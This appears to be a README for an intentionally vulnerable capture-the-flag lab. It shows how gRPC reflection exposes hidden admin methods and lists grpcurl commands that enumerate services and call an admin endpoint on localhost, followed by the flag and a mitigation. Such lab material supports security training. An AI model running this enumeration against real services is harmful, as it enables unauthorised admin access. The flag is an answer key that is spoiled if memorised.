# Lab 001: gRPC Reflection Enabled

## Vulnerability
Service Discovery API with gRPC reflection enabled, exposing hidden admin methods.

## Objective
Find and call the hidden admin method to capture the flag.

## Run the Lab
```bash
# Build and run
docker build -t grpc-001 .
docker run -p 8001:8001 grpc-001
```

## Exploit
```bash
# Install grpcurl
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# Discover services via reflection
grpcurl -plaintext localhost:8001 list

# Find hidden admin method
grpcurl -plaintext localhost:8001 list servicediscovery.ServiceDiscovery

# Call hidden admin endpoint
grpcurl -plaintext -d '{"admin_token": "fake"}' \
  localhost:8001 servicediscovery.ServiceDiscovery/AdminListAllServices
```

## Impact
Attackers can discover and access hidden admin services and internal endpoints.

## Flag
Successfully call the hidden admin method to get: `GRPC_GOAT{reflection_exposes_hidden_admin_methods}`

## Mitigation

Disable reflection in production.